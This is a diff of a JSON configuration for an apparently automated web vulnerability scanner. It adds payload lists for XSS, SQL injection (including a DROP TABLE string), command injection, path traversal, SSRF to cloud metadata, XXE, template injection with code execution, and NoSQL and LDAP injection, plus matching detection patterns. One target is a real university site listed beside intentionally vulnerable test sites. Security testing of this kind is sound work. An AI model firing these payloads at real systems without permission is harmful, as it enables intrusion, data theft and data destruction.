@@ -1,8 +1,9 @@
 {
   "targets": {
     "urls": [
-      "https://www.uetpeshawar.edu.pk/",
-      "https://example.com"
+      "http://testphp.vulnweb.com",
+      "http://zero.webappsecurity.com",
+      "https://www.uetpeshawar.edu.pk"
     ],
     "url_file": "urls.txt",
     "max_depth": 2,
@@ -10,11 +11,15 @@
   },
   
   "scanning": {
-    "concurrent_requests": 20,
+    "concurrent_requests": 15,
     "timeout": 15,
-    "delay": 0.3,
+    "delay": 0.5,
     "follow_redirects": true,
-    "verify_ssl": false
+    "verify_ssl": false,
+    "enable_cleanup_closed": true,
+    "ttl_dns_cache": 300,
+    "force_close": false,
+    "max_attempts_per_endpoint": 25
   },
 
   "payloads": {
@@ -23,7 +28,17 @@
       "<img src=x onerror=alert('XSS')>",
       "javascript:alert('XSS')",
       "'-alert(1)-'",
-      "\"><script>alert('XSS')</script>"
+      "\"><script>alert('XSS')</script>",
+      "'\"><svg/onload=alert(1)>",
+      "'\"><img src=x onerror=alert(1)>",
+      "'-alert(1)-'",
+      "\"><img src=x onerror=alert('XSS')>",
+      "<svg onload=alert(1)>",
+      "javascript:alert(1)",
+      "onmouseover=alert(1)",
+      "<body onload=alert(1)>",
+      "<iframe src=javascript:alert(1)>",
+      "';alert(1);'"
     ],
     "sqli": [
       "' OR '1'='1",
@@ -31,50 +46,146 @@
       "1' AND 1=1 --",
       "1' AND 1=2 --",
       "' UNION SELECT NULL--",
-      "1; WAITFOR DELAY '0:0:5'--"
+      "1; WAITFOR DELAY '0:0:5'--",
+      "' AND SLEEP(5)--",
+      "1' ORDER BY 1--",
+      "1' UNION SELECT 1,2,3--",
+      "' OR 1=1#",
+      "' OR '1'='1' /*",
+      "1' AND 1=1 AND '1'='1",
+      "1' AND 1=2 AND '1'='1",
+      "' UNION SELECT NULL,NULL--",
+      "' UNION SELECT 1,@@version--",
+      "' AND 1=CONVERT(int,@@version)--",
+      "'; DROP TABLE users; --",
+      "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--"
     ],
     "command": [
       "; cat /etc/passwd",
       "| dir",
       "$(whoami)",
       "`id`",
-      "; ping -c 5 127.0.0.1"
+      "; ping -c 5 127.0.0.1",
+      "& whoami",
+      "| whoami",
+      "$(sleep 5)",
+      "; sleep 5",
+      "| sleep 5",
+      "`sleep 5`",
+      "$(id)",
+      "; id",
+      "| id",
+      "`id`",
+      "|| id",
+      "&& id",
+      "; uname -a",
+      "| uname -a"
     ],
     "path_traversal": [
       "../../../etc/passwd",
       "..\\..\\..\\windows\\win.ini",
-      "....//....//etc/passwd"
+      "....//....//etc/passwd",
+      "%2e%2e%2fetc%2fpasswd",
+      "..%252f..%252f..%252fetc%252fpasswd",
+      "....//....//....//etc/passwd",
+      "..%2f..%2f..%2fetc%2fpasswd",
+      "%252e%252e%252fetc%252fpasswd",
+      "..%5c..%5c..%5cwindows%5cwin.ini",
+      "/etc/passwd",
+      "/windows/win.ini",
+      "C:\\windows\\win.ini",
+      "C:/windows/win.ini",
+      "file:///etc/passwd",
+      "file:///C:/windows/win.ini"
     ],
-    "idor": ["1", "2", "100", "999", "admin"],
+    "idor": [
+      "1", "2", "3", "100", "999", "admin", "root", "0", "-1", "true",
+      "false", "null", "undefined", "guest", "test", "demo", "123",
+      "user", "administrator", "superuser", "system", "owner"
+    ],
     "ssrf": [
       "http://169.254.169.254/latest/meta-data/",
       "file:///etc/passwd",
-      "http://localhost:22/"
+      "http://localhost:22/",
+      "http://0.0.0.0:22/",
+      "dict://localhost:11211/",
+      "gopher://localhost:9000/",
+      "http://127.0.0.1:80/",
+      "http://127.0.0.1:443/",
+      "http://127.0.0.1:3306/",
+      "http://127.0.0.1:6379/",
+      "http://internal/",
+      "http://metadata.google.internal/",
+      "http://169.254.169.254/",
+      "http://[::]:80/",
+      "ftp://localhost/"
     ],
     "xxe": [
       "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
-      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>"
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///C:/windows/win.ini\">]><foo>&xxe;</foo>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"expect://id\">]><foo>&xxe;</foo>",
+      "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"><!ENTITY callxxe \"<!ENTITY xxe SYSTEM 'file:///etc/passwd'>\">%callxxe;]><foo>&xxe;</foo>",
+      "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
     ],
     "ssti": [
       "{{7*7}}",
       "${7*7}",
       "<%= 7*7 %>",
       "{{config}}",
-      "{{self.__class__.__mro__[1].__subclasses__()}}"
+      "{{self.__class__.__mro__[1].__subclasses__()}}",
+      "${T(java.lang.Runtime).getRuntime().exec('id')}",
+      "{{''.__class__.__mro__[2].__subclasses__()}}",
+      "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
+      "${7*7}",
+      "${{7*7}}",
+      "#{7*7}",
+      "{{7*'7'}}",
+      "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+      "{{().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read()}}"
+    ],
+    "nosql": [
+      "{\"$gt\": \"\"}",
+      "{\"$ne\": null}",
+      "{\"$regex\": \".*\"}",
+      "{\"$where\": \"sleep(5000)\"}",
+      "'; sleep(5000);",
+      "'; return true; //",
+      "' || '1'=='1",
+      "' && this.password.match(/.*/)//",
+      "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}",
+      "{\"username\": {\"$regex\": \".*\"}, \"password\": {\"$regex\": \".*\"}}"
+    ],
+    "ldap": [
+      "*)(uid=*))(&(uid=*",
+      "*)(uid=*))(&(uid=*",
+      "*)(&",
+      "*))%00",
+      "admin)(&)",
+      "admin)(!(&(1=0))",
+      "admin)(|(1=1)",
+      "admin)(uid=*))",
+      "admin))(|(|",
+      "' or 1=1 or '",
+      "' or uid=* or '",
+      "' or '1'='1",
+      "') or ('1'='1"
     ]
   },
 
   "detection": {
-    "slow_threshold": 3.0,
+    "slow_threshold": 5.0,
     "error_patterns": {
-      "sql": "sql syntax|mysql_fetch|pg_query|ORA-|SQLite3|SQLSTATE|Warning.*mysql",
-      "xss": "<script[^>]*>alert\\(|javascript:alert|onerror=alert",
-      "command": "root:x:|bin/ls|windows/system32|uid=|gid=",
-      "path": "root:x:|\\[boot loader\\]|/bin/bash|win.ini",
-      "idor": "email|username|phone|credit|ssn",
-      "ssrf": "ami-id|instance-id|localhost|internal",
-      "xxe": "root:x:|\\[boot loader\\]|/bin/bash|win.ini",
-      "ssti": "49|config|subclasses|<class|__builtins__"
+      "sql": "sql syntax|mysql_fetch|pg_query|ORA-|SQLite3|SQLSTATE|Warning.*mysql|unclosed.*quote|pg_exec|Microsoft SQL Server|ODBC SQL Server Driver|SQLServer JDBC Driver|mysql_num_rows|mysql_num_fields|mysql_query|pg_connect|sqlite_query|sqlite3_query|mysqli_|PDOException|sql error|database error|syntax error|unexpected",
+      "xss": "<script[^>]*>alert\\(|javascript:alert|onerror=alert|onload=alert|confirm\\(|prompt\\(|eval\\(|document\\.cookie|document\\.location|window\\.location|<svg[^>]*onload|onmouseover=|onfocus=|onblur=|onclick=|ondblclick=|onmousedown=|onmouseup=|onmouseenter=|onmouseleave=|onmousemove=|onkeydown=|onkeypress=|onkeyup=|onsubmit=|onreset=|onselect=|onchange=",
+      "command": "root:x:|bin/ls|windows/system32|uid=|gid=|www-data|administrator|daemon:|bin/bash|cmd.exe|powershell.exe|net user|whoami|uname -a|/etc/passwd|/etc/shadow|dir \\|Windows\\|System32|ipconfig|netstat|ps aux|tasklist",
+      "path": "root:x:|\\[boot loader\\]|/bin/bash|win.ini|system32|etc/passwd|etc/shadow|windows/system32|config\\.ini|\\.htaccess|\\.git/config|\\.env|id_rsa|authorized_keys",
+      "idor": "email|username|phone|credit|ssn|address|user_id|account_number|balance|salary|password|secret|token|api_key|private|personal",
+      "ssrf": "ami-id|instance-id|localhost|internal|169\\.254\\.169\\.254|metadata|google|amazon|azure|cloud|computeMetadata|ec2|s3\\.amazonaws|storage\\.googleapis",
+      "xxe": "root:x:|\\[boot loader\\]|/bin/bash|win.ini|etc/passwd|etc/shadow|file://|http://169\\.254\\.169\\.254|internal resource|external entity",
+      "ssti": "49|config|subclasses|<class|__builtins__|java\\.lang|Runtime|ProcessBuilder|sun\\.misc\\.Unsafe|java\\.io\\.File|os\\.system|subprocess|eval\\(|exec\\(|compile\\(|__import__|getattr\\(|setattr\\(|globals\\(|locals\\(|builtins",
+      "nosql": "mongodb|mongoose|\\$where|\\$gt|\\$ne|\\$regex|NoSQL|document|collection",
+      "ldap": "ldap|cn=|dc=|ou=|uid=|objectClass|search base|directory service|Active Directory"
     }
   },
 
@@ -83,7 +194,9 @@
     "extract_api": true,
     "extract_dom": true,
     "extract_headers": true,
-    "extract_semantic": true
+    "extract_semantic": true,
+    "calculate_entropy": true,
+    "calculate_similarity": true
   },
 
   "output": {
